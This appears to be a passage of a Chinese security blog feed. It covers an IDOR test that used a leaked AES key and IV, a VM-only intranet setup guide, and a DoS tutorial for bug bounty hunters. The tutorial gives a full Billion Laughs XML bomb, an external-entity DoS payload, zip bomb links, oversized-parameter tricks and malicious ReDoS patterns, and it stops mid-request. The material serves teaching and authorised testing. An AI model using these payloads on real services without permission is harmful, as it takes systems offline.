&#125;<br></code></pre></td></tr></table></figure><p>已经很明显了，这是一个CBC方式的AES加密，密码是<code>bPsoyIvIALTcy6OP</code>，偏移量是<code>W8m2J1I3pQUADWy</code>，直接把加密后的密文用工具解出来：</p><p><img src="/2021/07/22/%E4%B8%80%E6%AC%A1%E5%89%8D%E7%AB%AFJS%E5%8A%A0%E5%AF%86%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95/image-20210722134025857.png" alt></p><p>这时候思路已经很明显了，我们可以构造其他人的uid来获取历史会话，再对uid进行上述AES加密，把刚刚获取到的会话值也一并提交，就可以实现越权查看他人历史记录的效果。</p><h2 id="0x03-结果">0x03 结果</h2><p>测试成功，无图~</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>仅虚拟机连接内网的配置方法</title>
    <link href="/2021/06/28/%E4%BB%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/06/28/%E4%BB%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>有的时候我们由于工作原因不得不接入内网。如果此时物理机里含有破解程序、攻击软件，这可能会给内网带来一些安全的隐患。在这种情景下，我想出了一个办法：仅让安装纯净系统的虚拟机连接到内网，而物理机连接到其他网络。这样一来物理机的流量就不会干扰到内网，我们也可以利用虚拟机在内网完成自己的工作。</p><h2 id="0x01-操作方法">0x01 操作方法</h2><p>这里假定用网线连接到内网，以Vmware虚拟机为例。</p><p>首先配置虚拟网络编辑器，这个编辑器在<em>编辑菜单→虚拟网络编辑器</em>，点开后点击右下角的更改设置，才会出现桥接网卡。如果没有出现，则新建一个。</p><p><img src="/2021/06/28/%E4%BB%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E7%9A%84%E9%85%8D%E7%BD%AE/image-20210628171718255.png" alt></p><p><strong>注意：这里一定要指定连接网线的那个网卡，不然虚拟机可能无法正确获取网络。</strong></p><p>之后在打开<em>控制面板\所有控制面板项\网络连接</em>，找到你的<strong>连接网线的那个网卡</strong>，右键属性，除了<strong>VMware Bridge Protocol</strong>协议打勾，其余的全部取消掉，之后打开你的虚拟机正常配置内网IP就可以了。</p><p><img src="/2021/06/28/%E4%BB%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E7%9A%84%E9%85%8D%E7%BD%AE/image-20210628171923945.png" alt></p><p>最后一定不要忘了虚拟机本身设置桥接模式：</p><p><img src="/2021/06/28/%E4%BB%85%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E7%9A%84%E9%85%8D%E7%BD%AE/image-20210628172110848.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈拒绝服务攻击</title>
    <link href="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    <url>/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2><p>拒绝服务攻击漏洞其实在很早之前就已经被广泛应用。骇客或者脚本小子经常拿着一堆肉鸡或者工具来打服务器，造成服务器宕机。</p><p>在实际的SRC漏洞挖掘中，其实有一些厂商也是收拒绝服务漏洞的，也有一些厂商为了自己的业务安全不收该漏洞，但是无论如何也不能忽视拒绝服务漏洞导致的巨大危害。</p><p>目前，网络上存在的一些培训视频或者培训机构，针对漏洞挖掘这块往往会漏掉拒绝服务这块，这篇文章也是参考了大佬们的一些东西，做了一个整理和记录。</p><div class="note note-danger">            <p>注意：拒绝服务攻击漏洞在挖掘和利用的时候有一定的危险性，请在授权情况下进行压力测试和漏洞挖掘。</p>          </div><h2 id="0x01-类型">0x01 类型</h2><p>拒绝服务攻击漏洞大致分为<strong>带宽消耗型</strong>和<strong>资源消耗型</strong>，但都是通过大量合法或者伪造的请求来占用网络和系统资源，达到瘫痪和网络与系统的效果。</p><h3 id="带宽消耗型">带宽消耗型</h3><p><strong>带宽消耗攻击分为两个层次：泛洪攻击和放大攻击。</strong></p><p>洪泛攻击特点使利用僵尸程序发送大量流量至被攻击者，目的在于使其堵塞带宽。</p><p>放大攻击与洪泛攻击类似，通过恶意放大流量限制受害者的带宽。</p><p>攻击者伪造攻击目标A的IP地址，向网络上存在某些漏洞的服务器B发送请求。服务器B接收到这些请求时，会向攻击目标A发送应答。由于服务器B本身就存在服务漏洞，所以发送的应答包比请求包还要大。这样就使用少量的带宽，就可以发送大量应答到攻击目标A。<s>这就是借刀杀人。</s></p><h4 id="远古攻击方式">远古攻击方式</h4><p>之所以称为远古攻击方式，是因为我在近几年没怎么听说过用以下几种方法来进行攻击的。包括下面写出的死亡之ping之类的漏洞，绝大多数都修复了。这里仅作记录，不详细解释了。</p><h5 id="UDP洪水攻击">UDP洪水攻击</h5><p>已知UDP是不需要握手验证的，所以可以发送大量UDP包来消耗带宽。</p><h5 id="死亡之ping">死亡之ping</h5><p>通常，一次ping大小为32字节（若考虑IP标头则为84字节）。在当时，大部分电脑无法处理大于IPv4最大封包大小（65,535字节）的ping封包。因此发送这样大小的ping可以令目标电脑崩溃。</p><h5 id="ICMP洪水攻击">ICMP洪水攻击</h5><p>提升发包速率的Ping攻击。</p><h5 id="泪滴攻击">泪滴攻击</h5><p>泪滴攻击指的是向目标机器发送损坏的IP包，诸如重叠的包或过大的包载荷。借由这些手段，该攻击可以通过TCP/IP协议栈中分片重组代码中的漏洞来瘫痪各种不同的操作系统。</p><h3 id="资源消耗型">资源消耗型</h3><h4 id="LAND攻击">LAND攻击</h4><p>这种攻击方式与SYN floods类似，不过在LAND攻击包中的源地址和目标地址都是攻击对象的IP。这种攻击会导致被攻击的机器死循环，最终耗尽资源而死机。</p><h4 id="CC攻击">CC攻击</h4><div class="note note-info">            <p>2004年，一位匿名为KiKi的中国黑客开发了一种用于发送HTTP请求的DDoS攻击工具以攻击名为“Collapsar”的NSFOCUS防火墙，因此该黑客工具被称为“Challenge Collapsar”（挑战黑洞，简称CC），这类攻击被称作“CC攻击”。（源自维基百科）</p>          </div><p>*实际上挖掘中，基本都是CC攻击。*利用程序不合理的逻辑，或者限制上的缺陷，来完成一次DOS攻击。虽然一次效果可能不佳，但是多次重放之后能达到以小成本撬动整个网站的服务。</p><p>CC攻击使用代理服务器向受害服务器发送大量貌似合法的请求（通常为HTTP GET)。攻击者创造性地使用代理，利用广泛可用的免费代理服务器发动DDoS攻击。许多免费代理服务器支持匿名，这使追踪变得非常困难。</p><h4 id="僵尸网络攻击（分布式HTTP洪水攻击）">僵尸网络攻击（分布式HTTP洪水攻击）</h4><p>僵尸网络是指大量被命令与控制（C&amp;C）服务器所控制的互联网主机群。攻击者传播恶意软件并组成自己的僵尸网络。僵尸网络难于检测的原因是，僵尸主机只有在执行特定指令时才会与服务器进行通讯，使得它们隐蔽且不易察觉。僵尸网络根据网络通讯协议的不同分为IRC、HTTP或P2P类等。</p><h2 id="0x02-案例">0x02 案例</h2><p><em>下面案例参考了key师傅和鸡哥的博客，详情见本文末的参考。</em></p><h3 id="资源生成可控">资源生成可控</h3><p>有一些资源是客户端利用接口来提交给服务端生成的（比如验证码、二维码），但是此时服务端如果没有做参数限制的话，就会存在拒绝服务的风险。</p><h4 id="验证码">验证码</h4><p>图片验证码在登录、注册、找回密码…等功能比较常见：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911055744176.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911055744176.jpg" alt="验证码图片"></a></p><p>关注一下接口地址：<code>https://attack/validcode?w=130&amp;h=53</code></p><p>参数值：<code>w=130&amp;h=53</code>，我们可以理解为生成的验证码大小<strong>长为130</strong>，<strong>宽为53</strong>。</p><p>可以将<code>w=130</code>修改为<code>w=130000000000000000</code>，让服务器生成超大的图片验证码从而占用服务器资源造成拒绝服务。</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911060427058.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911060427058.jpg" alt="资源被消耗了"></a></p><h3 id="提交数据未限制">提交数据未限制</h3><p>在有些网站的提交接口，服务器会对提交的内容进行检查，此时如果服务端没有对提交内容做限制，也会存在拒绝服务的风险。</p><h4 id="搜索">搜索</h4><p>搜索接口可能会带有类似与<code>limit</code>、<code>pagenum</code>、<code>pagesize</code>这类参数，增加该参数值可以让服务器返回的内容增加（取决于搜索结果），达到拒绝服务的效果。</p><p><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/1611668802976-d1eb4b42-123d-4729-b398-87add17f9738.png" alt="右下角有明显延迟"></p><p>也有POST类型的搜索接口：</p><p><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/image-20210531112003467-1622432331901.png" alt="提交类型的搜索功能"></p><h4 id="信息">信息</h4><p>私信或者普通的留言功能也可能存在该种风险。如果后端没有对前端提交的数据做长度限制，可以写大量的脏数据来实现拒绝服务的效果。</p><p>并且如果该功能在APP上也存在，不仅在服务器端造成影响，而且可以波及到被私信的一般用户，从而实现<strong>任意用户手机客户端拒绝服务的效果</strong>，危害性极大。</p><p><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/image-20210531112203020-1622432333186.png" alt="私信功能"></p><div class="note note-secondary">            <p>下面的攻击类型对我来说比较新颖，实际挖掘还没有这样的案例，所以直接就复制过来了。</p>          </div><h3 id="Zip炸弹">Zip炸弹</h3><p>不知道各位有没有听说过Zip炸弹，一个42KB的压缩文件(Zip)，解压完其实是个<code>4.5PB</code>的“炸弹”。</p><p>先不说<code>4.5PB</code>这个惊人的大小，光解压都会占用极大的内存。</p><p>该文件的下载地址：<a href="https://www.bamsoftware.com/hacks/zipbomb/42.zip">https://www.bamsoftware.com/hacks/zipbomb/42.zip</a></p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911070729869.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911070729869.jpg" alt></a></p><blockquote><p>解压这个<code>42.zip</code>以后会出现<code>16</code>个压缩包，每个压缩包又包含<code>16</code>个，如此循环<code>5</code>次，最后得到<code>16</code>的<code>5</code>次方个文件，也就是<code>1048576</code>个文件，这一百多万个最终文件，每个大小为<code>4.3GB</code>。 因此整个解压过程结束以后，会得到 <code>1048576 * 4.6 GB = 4508876.8 GB</code>，也就是 <code>4508876.8 ÷ 1024 ÷ 1024 = 4.5 PB</code>。</p></blockquote><p>通过以上说明，我们可以寻找存在解压功能的Web场景进行拒绝服务攻击，但是这里有一个前置条件就是需要解压并可以递归解压。</p><p>那我们想要完成这一攻击就非常的困难了，“前辈”也提到了非递归的Zip炸弹，也就是没有嵌套Zip文件文件的，如下表格：</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">解压结果</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip">zbsm.zip</a></td><td style="text-align:left">42 kB → 5.5 GB</td></tr><tr><td style="text-align:left"><a href="https://www.bamsoftware.com/hacks/zipbomb/zblg.zip">zblg.zip</a></td><td style="text-align:left">10 MB → 281 TB</td></tr><tr><td style="text-align:left"><a href="https://www.bamsoftware.com/hacks/zipbomb/zbxl.zip">zbxl.zip</a></td><td style="text-align:left">46 MB → 4.5 PB (Zip64, less compatible)</td></tr></tbody></table><p>存在解压功能的Web场景还是比较多的，可以根据实际业务场景进行寻找。</p><h4 id="实际场景">实际场景</h4><p>根据实际业务场景发现一处上传模板文件功能，根据简单的测试，发现此处上传Zip文件会自动解压：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911064054609.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911064054609.jpg" alt></a></p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911081629641.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911081629641.jpg" alt></a></p><p>这里我选择上传<code>zbsm.zip</code>上去，看一下服务器反应:</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911091742556.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911091742556.jpg" alt></a></p><p>这里整个服务的请求都没有返回结果，成功造成拒绝服务。</p><h3 id="XDoS-XML拒绝服务攻击">XDoS(XML拒绝服务攻击)</h3><p>XDoS，XML拒绝服务攻击，其就是利用DTD产生XML炸弹，当服务端去解析XML文档时，会迅速占用大量内存去解析，下面我们来看几个XML文档的例子。</p><h4 id="Billion-Laughs">Billion Laughs</h4><p>据说这被称为<strong>十亿大笑DoS攻击</strong>，其文件内容为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;!DOCTYPE keyz [</span><br><span class="hljs-params">  &lt;!ENTITY key &quot;key&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key2 &quot;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;<span class="hljs-variable">&amp;key</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key3 &quot;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;<span class="hljs-variable">&amp;key2</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key4 &quot;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;<span class="hljs-variable">&amp;key3</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key5 &quot;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;<span class="hljs-variable">&amp;key4</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key6 &quot;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;<span class="hljs-variable">&amp;key5</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key7 &quot;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;<span class="hljs-variable">&amp;key6</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key8 &quot;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;<span class="hljs-variable">&amp;key7</span>;&quot;&gt;</span><br>  <span class="hljs-params">&lt;!ENTITY key9 &quot;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;<span class="hljs-variable">&amp;key8</span>;&quot;&gt;</span><br>]&gt;<br><span class="hljs-params">&lt;keyz&gt;</span><span class="hljs-variable">&amp;key9</span><span class="hljs-punctuation">;</span><span class="hljs-params">&lt;/keyz&gt;</span><br></code></pre></td></tr></table></figure><p>这是一段实体定义，从下向上观察第一层发现<code>key9</code>由10个<code>key8</code>组成，由此类推得出<code>key[n]</code>由10个<code>key[n-1]</code>组成，那么最终算下来实际上<code>key9</code>由<code>10^9</code>(1000000000)个<code>key[..]</code>组成，也算是名副其实了～</p><p>本地测试解析该XML文档，大概占用内存在2.5GB左右（其他文章中出现的均为3GB左右内存）：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911734062132.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911734062132.jpg" alt></a></p><p>试想：<strong>这只是9层级炸弹，如果再多一点呢？</strong></p><h4 id="External-Entity">External Entity</h4><p>外部实体引用，文档内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">keyz</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">wechat</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">keyz</span>&gt;</span><span class="hljs-symbol">&amp;wechat;</span><span class="hljs-tag">&lt;/<span class="hljs-name">keyz</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个理解起来就很简单了，就是从外部的链接中去获取解析实体，而我们可以设置这个解析URL为一个超大文件的下载地址，以上所举例就是微信的。</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911781853694.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911781853694.jpg" alt></a></p><p>当然，我们也可以设置一个不返回结果的地址，如果外部地址不返回结果，那么这个解析就会在此处一直挂起从而占用内存。</p><h4 id="Internal-Entity">Internal Entity</h4><p>内部实体引用，文档内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">keyz</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY a <span class="hljs-string">&quot;a...a&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">keyz</span>&gt;</span><span class="hljs-symbol">&amp;a;</span>...<span class="hljs-symbol">&amp;a;</span><span class="hljs-tag">&lt;/<span class="hljs-name">keyz</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其意思就是实体<code>a</code>的内容又臭又长，而后又N次引用这个实体内容，这就会造成解析的时候占用大量资源。</p><h4 id="实际场景-2">实际场景</h4><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15911513808996.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15911513808996.jpg" alt></a></p><p>一开始通过此处上传<code>doc</code>文档的功能，发现了一枚<code>XXE注入</code>，提交后厂商进行修复，但复测后发现其修复的结果就是黑名单<code>SYSTEM</code>关键词，没办法通过带外通道读取敏感数据了～</p><p>抱着试一试的心态将<code>Billion Laughs</code>的<code>Payload</code>放入到<code>doc</code>文档中(这里与<code>XXE doc文档</code>制作方式一样修改<code>[Content_Types].xml</code>文件，重新打包即可)：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15912347343829.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15912347343829.jpg" alt></a></p><p>上传之后产生的效果就是网站延时极高，至此就完成了整个测试。</p><h3 id="ReDoS-正则表达式拒绝服务攻击">ReDoS(正则表达式拒绝服务攻击)</h3><p>ReDoS，正则表达式拒绝服务攻击，顾名思义，就是由正则表达式造成的拒绝服务攻击，当编写校验的正则表达式存在缺陷或者不严谨时，攻击者可以构造特殊的字符串来大量消耗服务器的系统资源，造成服务器的服务中断或停止。</p><p>在正式了解ReDoS之前，我们需要先了解一下正则表达式的两类引擎：</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">区别</th><th style="text-align:left">应用</th><th style="text-align:left">匹配方式</th></tr></thead><tbody><tr><td style="text-align:left">DFA</td><td style="text-align:left">DFA对于文本串里的每一个字符只需扫描一次，速度快、特性少</td><td style="text-align:left">awk(大多数版本)、egrep（大多数版本）、flex、lex、MySQL、Procmail…</td><td style="text-align:left">文本比较正则</td></tr><tr><td style="text-align:left">NFA</td><td style="text-align:left">NFA要翻来覆去标注字符、取消标注字符，速度慢，但是特性(如:分组、替换、分割)丰富</td><td style="text-align:left">GNU Emacs、Java、grep（大多数版本）、less、more、.NET语言、PCRE library、Perl、PHP（所有三套正则库）、Python、Ruby、set（大多数版本）、vi…</td><td style="text-align:left">正则比较文本</td></tr></tbody></table><p>文本比较正则：看到一个子正则，就把可能匹配的文本全标注出来，然后再看正则的下一个部分，根据新的匹配结果更新标注。</p><p>正则比较文本：看见一个字符，就把它跟正则比较，匹配就标注下来，然后接着往下匹配。一旦不匹配，就忽略这个字符，以此类推，直到回到上一次标注匹配的地方。</p><p>那么存在ReDoS的核心就是<strong>NFA正则表达式引擎</strong>，它的多模式会让自身陷入递归险境，从而导致占用大量CPU资源，性能极差，严重则导致拒绝服务。</p><h4 id="NFA-回溯">NFA 回溯</h4><p>简单的聊一下什么是回溯，这里有一个正则表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs regex">ke&#123;1,3&#125;y <br></code></pre></td></tr></table></figure><p>其意图很简单，<code>e</code>字符需要匹配1-3次，<code>k</code>、<code>y</code>匹配一次即可。</p><p>现在我们遇到了两个需要匹配的字符串：</p><ul><li>keeey</li><li>key</li></ul><p>字符串<code>keeey</code>的匹配过程是一气呵成的：匹配<code>k</code>完成之后，完整匹配<code>e</code>，最后是匹配<code>y</code></p><p>字符串<code>key</code>的匹配过程就发生了回溯，其匹配过程如下图所示（<strong>橙色为匹配，黄色为不匹配</strong>）：</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15912407800934.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15912407800934.jpg" alt></a></p><p>前两步属于正常，但从第3步开始就不一样了，这里字符串<code>key</code>已经有一个<code>e</code>被<code>e&#123;1,3&#125;</code>匹配，但它不会就此作罢，而会继续向后用正则<code>e&#123;1,3&#125;</code>匹配字符<code>y</code>，而当发现字符不匹配后，就忽略该字符，返回到上一次标注匹配的字符<code>e</code>再进行一次匹配，至此就发生了一次回溯，最后匹配<code>y</code>结束整个正则匹配过程。</p><p>那么为什么会产生回溯呢？这跟NFA的贪婪模式有关（贪婪模式默认是开启的）。</p><h4 id="NFA-贪婪">NFA 贪婪</h4><p>我们想要彻底摸清楚整个过程就要抛根问底，究其原理，所以来了解一下贪婪模式～</p><p>根据以上所举的案例我们可以理解贪婪模式导致的回溯其实就是：<strong>不撞南墙不回头</strong></p><p>以下所列的元字符，大家应该都清楚其用法：</p><p>i. <code>?</code>: 告诉引擎匹配前导字符0次或一次，事实上是表示前导字符是可选的。 ii. <code>+</code>: 告诉引擎匹配前导字符1次或多次。 iii. <code>*</code>: 告诉引擎匹配前导字符0次或多次。 iv. <code>&#123;min, max&#125;</code>: 告诉引擎匹配前导字符min次到max次。min和max都是非负整数。如果有逗号而max被省略了，则表示max没有限制；如果逗号和max都被省略了，则表示重复min次。</p><p>默认情况下，这个几个元字符都是贪婪的，也就是说，它会根据前导字符去匹配尽可能多的内容。这也就解释了之前所举例的回溯事件了。</p><h4 id="恶意正则表达式">恶意正则表达式</h4><p>错误的使用以上所列的元字符就会导致拒绝服务的风险，此类称之为恶意的正则表达式，其表现形式为：</p><ol><li>使用重复分组构造</li><li>在重复组内会出现：重复、交替重叠</li></ol><p>简单的表达出来就是以下几种情况(有缺陷的正则表达式会<strong>包含如下部分</strong>)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs regex">(a+)+<br>([a-zA-Z]+)*<br>(a|aa)+<br>(a|a?)+<br>(.*a)&#123;x&#125; for x &gt; 10<br></code></pre></td></tr></table></figure><h4 id="ReDoS-恶意正则检测">ReDoS 恶意正则检测</h4><p>对于复杂的恶意正则表达式，靠人工去看难免有些许费劲，推荐一款工具：<a href="https://github.com/superhuman/rxxr2/tree/fix-multiline">https://github.com/superhuman/rxxr2/tree/fix-multiline</a> (安装参考项目的<code>readme</code>)</p><p>该工具支持大批量的正则表达式检测，并给出检测结果。</p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15913217511512.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15913217511512.jpg" alt></a></p><h4 id="实际场景-3">实际场景</h4><p>很庆幸的是大多Web脚本语言的正则引擎都为NFA，所以也很方便我们做一些Web层面的挖掘。</p><p>做测试的时候大家有没有发现过这样一个逻辑：<strong>密码中不能包含用户名</strong></p><p><a href="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-06-22/15912543787232.jpg"><img src="/2021/05/31/%E6%B5%85%E8%B0%88%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/15912543787232.jpg" alt></a></p><p>这是一个用户添加的功能，其校验是通过后端的，请求包如下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts">POST <span class="hljs-keyword">/index/</span>userAdd HTTP/<span 